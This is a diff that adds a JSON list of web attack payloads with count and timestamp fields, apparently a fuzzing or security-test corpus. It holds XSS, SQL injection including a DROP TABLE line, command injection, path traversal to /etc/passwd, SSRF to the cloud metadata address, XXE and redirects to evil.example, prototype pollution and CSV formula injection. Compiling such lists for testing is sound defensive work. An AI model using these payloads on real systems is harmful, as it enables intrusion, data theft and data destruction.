@@ -1,0 +1,518 @@
+[
+    {
+        "text": "<script>alert(1)</script>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "\"><img src=x onerror=alert(1)>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "'\"><svg/onload=alert(1)>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<img src=\"x\" onerror=\"alert('XSS')\">",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<body onload=alert(1)>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<iframe src=\"javascript:alert(1)\">",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "javascript:alert(1)",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<details open ontoggle=alert(1)>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<IMG SRC=JaVaScRiPt:alert(1)>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "' OR '1'='1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "\" OR \"1\"=\"1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "' OR 1=1--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "\" OR 1=1--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "admin'--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "' UNION SELECT NULL,NULL--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "1'; DROP TABLE users--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "' OR 1=1#",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "') OR ('1'='1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "1' AND SLEEP(5)--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{\"$gt\": \"\"}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{\"$ne\": null}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "'; return true; var foo='",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{\"username\": {\"$regex\": \".*\"}}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "; id",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "| whoami",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "$(whoami)",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "& dir",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "|| ping -c 3 127.0.0.1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "../../../etc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "....//....//etc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "..\\..\\..\\windows\\win.ini",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "..%252f..%252f..%252fetc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "/etc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "file:///etc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://127.0.0.1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://localhost/admin",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://169.254.169.254/latest/meta-data/",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://[::1]/",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://127.1/",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://0.0.0.0/",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "*)(uid=*))(|(uid=*",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "admin)(|(password=*",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.example/xxe\">]><foo>&xxe;</foo>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{{7*7}}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "${7*7}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<%= 7*7 %>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "#{7*7}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "*{7*7}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%0d%0aSet-Cookie: malicious=true",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "\r\nX-Injected: true",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "//evil.example",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "https://evil.example",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "/\\evil.example",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "@evil.example",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "value\r\nX-Injected: true",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{__schema{types{name}}}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "query{__typename}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{\"__proto__\":{\"isAdmin\":true}}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.invalid",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "0",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "-1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "999999999",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "../1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%s%s%s%s%s",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%x%x%x%x",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "2147483647",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "-2147483648",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "99999999999999999999",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "＜script＞alert(1)＜/script＞",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": false
+    },
+    {
+        "text": "=cmd|'/c calc'!A0",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "+cmd|'/c calc'!A0",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "php://filter/convert.base64-encode/resource=index.php",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "expect://id",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "<scr\u0000ipt>alert(1)</script>",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "1 OR 1=1",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "1; WAITFOR DELAY '0:0:5'--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "' AND 1=CONVERT(int,(SELECT @@version))--",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "http://2130706433/",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "127.0.0.1.nip.io",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "%00../../../etc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    },
+    {
+        "text": "..%c0%af..%c0%afetc/passwd",
+        "count": 0,
+        "timestamp": 1744624800000,
+        "is_ascii": true
+    }
+]
